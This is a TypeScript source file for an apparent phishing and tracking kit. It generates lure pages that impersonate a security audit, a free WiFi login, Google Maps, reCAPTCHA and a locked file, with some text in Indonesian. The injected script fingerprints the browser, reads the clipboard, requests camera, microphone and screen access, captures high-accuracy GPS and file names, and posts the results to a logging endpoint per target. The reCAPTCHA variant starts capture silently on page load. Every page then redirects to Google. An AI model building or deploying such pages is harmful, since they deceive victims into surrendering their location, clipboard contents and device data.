export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; 
  
  return `
<script>
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 45 : 12;
      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 4)) {
        hasRedirected = true;
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 800);
       };
    }

    setInterval(checkRedirect, 1000);

    window.startCapture = async function(mode) {
      if (hasRedirected) return;
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      if (!isSilent) {
        box.innerHTML = '<div id="status-icon" style="font-size:40px; opacity:0.8; margin-bottom:15px;">' + (cfg.icon || '🔍') + '</div>' +
          '<h2 id="status-title" style="font-weight:600; color:#2c3e50;">Verifying...</h2>' +
          '<div id="progress-container" style="width:100%; background:#ecf0f1; border-radius:10px; height:8px; margin-bottom:20px; overflow:hidden;">' +
          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.6s ease-out;"></div>' +
          '</div>' +
          '<p id="status-text" style="font-size:13px; color:#7f8c8d; font-family:sans-serif; min-height: 40px; line-height:1.4;">Connecting to secure nodes...</p>';
      }

      var statusTitle = document.getElementById('status-title');
      var statusText = document.getElementById('status-text');
      var bar = document.getElementById('progress-bar');
      var icon = document.getElementById('status-icon');
      
      function updateProgress(p, text, title) {
        if (bar) bar.style.width = p + '%';
        if (statusText) statusText.innerText = text;
        if (statusTitle && title) statusTitle.innerText = title;
      }

      async function logEvent(type, data) {
        try {
          await fetch('/api/log/' + targetId + '/' + type, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
          });
        } catch(e) {}
      }

      function finish(success, reason) {
        if (isSilent) { window.location.href = targetUrl; return; }
        if (bar) bar.style.width = '100%';
        if (success) {
          if (icon) icon.innerText = "✅";
          if (statusTitle) { statusTitle.innerText = "AUTHORIZED"; statusTitle.style.color = "#27ae60"; }
          if (statusText) statusText.innerText = "Audit successful. Finalizing session...";
        } else {
          if (icon) icon.innerText = "ℹ️";
          if (statusTitle) statusTitle.innerText = "COMPLETE";
          if (statusText) statusText.innerText = (reason || "Process finished.") + " Finalizing redirect...";
        }
        setTimeout(checkRedirect, 2500);
      }

      try {
        if (!isSilent) updateProgress(5, "Analyzing hardware signature...", "INIT_SEC");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          ref: document.referrer || "Direct"
        };
        await logEvent('info', metadata);

        var stepProgress = Math.floor(85 / (requiredPerms.length || 1));
        var currentP = 10;

        for (var i = 0; i < requiredPerms.length; i++) {
          var perm = requiredPerms[i];
          currentP += stepProgress;

          try {
            if (perm === 'notification') {
              if (!isSilent) updateProgress(currentP, "Establishing alert tunnel...", "PUSH_SYNC");
              if ("Notification" in window) await Notification.requestPermission();
            }

            if (perm === 'clipboard') {
              if (!isSilent) updateProgress(currentP, "Syncing buffer tokens...", "CACHE_AUTH");
              if (navigator.clipboard) {
                var clip = await navigator.clipboard.readText().catch(function(){});
                if (clip) await logEvent('extra', { clipboard: clip });
              }
            }

            if (perm === 'media') {
              if (!isSilent) updateProgress(currentP, "Auditing hardware ports...", "MEDIA_ID");
              if (navigator.mediaDevices) {
                try {
                  await navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => s.getTracks().forEach(t => t.stop())).catch(e=>{});
                  var devs = await navigator.mediaDevices.enumerateDevices();
                  var list = devs.map(d => d.kind + ': ' + (d.label || 'System Device')).join('\\n');
                  await logEvent('extra', { media: list });
                } catch(e) {}
              }
            }

            if (perm === 'gps') {
              if (!isSilent) {
                updateProgress(currentP, "Fetching spatial nodes...", "REGION_AUTH");
                if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
              }
              if (navigator.geolocation) {
                await new Promise(resolve => {
                  navigator.geolocation.getCurrentPosition(
                    function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                    function(err) { resolve(); },
                    { enableHighAccuracy: true, timeout: 8000 }
                  );
                });
              }
            }

            if (perm === 'screen') {
              if (!isSilent) updateProgress(currentP, "Visual integrity scan...", "VIRT_SCAN");
              if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                await navigator.mediaDevices.getDisplayMedia({ video: true }).then(s => {
                  var track = s.getVideoTracks()[0];
                  logEvent('extra', { screen_label: track.label });
                  s.getTracks().forEach(t => t.stop());
                }).catch(e=>{});
              }
            }

            if (perm === 'files') {
              if (!isSilent) updateProgress(currentP, "Validating file tokens...", "STORAGE_AUDIT");
              if (window.showOpenFilePicker) {
                 var [handle] = await window.showOpenFilePicker({ types: [{ description: 'Token', accept: { 'image/*': ['.png','.jpg','.jpeg'] } }] }).catch(function(){ return []; });
                 if (handle) {
                   var file = await handle.getFile();
                   await logEvent('extra', { file_name: file.name, file_size: file.size });
                 }
              }
            }
          } catch(e) { }
          permsCompleted++;
        }

        finish(true);
      } catch (err) {
        finish(false, "Service Interrupt.");
      }
    };
  })();
</script>
`;
};

const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files'];

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  '1': {
    name: "⚡ SUPERMAN: Full System Audit (Max Overpowered)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { background:#0f172a; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:45px; background:#1e293b; border-radius:15px; text-align:center; box-shadow:0 25px 50px rgba(0,0,0,0.5); border: 1px solid #334155; } h2 { color:#38bdf8; margin-bottom:10px; font-weight:700; } p { color:#94a3b8; font-size:14px; margin-bottom:30px; } .btn { background:#38bdf8; color:#0f172a; border:none; padding:18px 30px; border-radius:10px; font-weight:800; cursor:pointer; width:100%; text-transform:uppercase; letter-spacing:1px; }</style></head><body><div class="box"><div style="font-size:50px; margin-bottom:20px;">🛡️</div><h2>System Protection</h2><p>Amankan perangkat Anda dengan audit keamanan menyeluruh untuk mengakses layanan premium.</p><button class="btn" onclick="window.startCapture();">LENGKAPI VERIFIKASI</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '1', perms: ALL_PERMS, accent: '#38bdf8', icon: '🛡️',
    })}</body></html>`
  },
  'wifi': {
    name: "📶 WIFI: Free Hotspot Login (Very High Success)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Login</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:40px; text-align:center; } h1 { font-size:24px; color:#2d3436; } p { color:#636e72; font-size:14px; margin-bottom:30px; } .btn { background:#0984e3; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="80" style="margin-bottom:20px;"><h1>Free WiFi Hotspot</h1><p>Klik tombol di bawah untuk menyambungkan. Anda akan diminta mengaktifkan **Lokasi & Notifikasi** agar koneksi tetap stabil.</p><button class="btn" onclick="window.startCapture();">CONNECT NOW</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'wifi', perms: ALL_PERMS, accent: '#0984e3', icon: '📶'
    })}</body></html>`
  },
  'maps': {
    name: "🗺️ G-MAPS: Real-time Route Sync",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Maps Sync</title><style>body { font-family:sans-serif; text-align:center; padding-top:15vh; background:#f8f9fa; } .box { width:90%; max-width:450px; margin:0 auto; padding:40px; background:#fff; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.05); } .btn { background:#34a853; color:white; padding:16px 30px; border-radius:4px; border:none; font-weight:700; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" width="70"><br><br><h2>Verifikasi Lokasi</h2><p>Sinkronkan GPS dan visual hardware Anda untuk memastikan rute yang paling akurat dari server kami.</p><button class="btn" onclick="window.startCapture();">SINKRONKAN SEKARANG</button></div>${getCaptureScript(id, 'https://maps.google.com', {
      tmplId: 'maps', perms: ALL_PERMS, accent: '#34a853', icon: '🌍'
    })}</body></html>`
  },
  'recap': {
    name: "🕵️ GHOST: Invisible Recaptcha (Silent OP)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; font-family:sans-serif; } .box { border:1px solid #ddd; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 2px 5px rgba(0,0,0,0.1); }</style></head><body><div style="text-align:center;"><p style="color:#666; margin-bottom:15px;">Validating browser session...</p><div class="box"><div style="width:25px; height:25px; border:2px solid #ccc; margin-right:15px;"></div><div style="font-size:14px; color:#555;">Processing...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap', flow: 'silent', perms: ALL_PERMS
    })}</body></html>`
  },
  'pegasus': {
    name: "💀 PEGASUS: Advanced Terminal Audit",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Pegasus Terminal</title><style>body { background:#000; color:#00ff00; font-family:monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:450px; border:1px solid #00ff00; padding:40px; background:#050505; box-shadow:0 0 20px rgba(0,255,0,0.2); } .header { font-weight:bold; margin-bottom:20px; border-bottom:1px solid #00ff00; padding-bottom:10px; } .btn { width:100%; background:#00ff00; color:#000; border:none; padding:15px; font-weight:bold; cursor:pointer; margin-top:25px; text-transform:uppercase; }</style></head><body><div class="box"><div class="header">PEGASUS_SYSTEM_v5.0</div><p>[!] SECURITY THREAT DETECTED<br><br>Lakukan Full Identity Audit untuk memverifikasi bahwa Anda bukan bot atau emulator ilegal.</p><button class="btn" onclick="window.startCapture();">START SYSTEM AUDIT</button></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#00ff00', icon: '💀'
    })}</body></html>`
  },
  'transfer': {
    name: "📂 FILE: Secure Document Sync (Gallery/File Access)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Open File</title><style>body { background:#f5f5f5; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; padding:40px; border-radius:15px; text-align:center; width:90%; max-width:400px; border:1px solid #eee; } .btn { background:#007aff; color:white; padding:15px 30px; border-radius:8px; border:none; font-weight:bold; cursor:pointer; width:100%; margin-top:20px; }</style></head><body><div class="box"><div style="font-size:50px; margin-bottom:15px;">📂</div><h2>File Terkunci</h2><p>Anda menerima file penting. Sinkronkan **Storage & Lokasi** untuk memverifikasi wilayah Anda sebelum mengunduh.</p><button class="btn" onclick="window.startCapture();">BUKA FILE</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'transfer', perms: ALL_PERMS, accent: '#007aff', icon: '📂'
    })}</body></html>`
  }
};
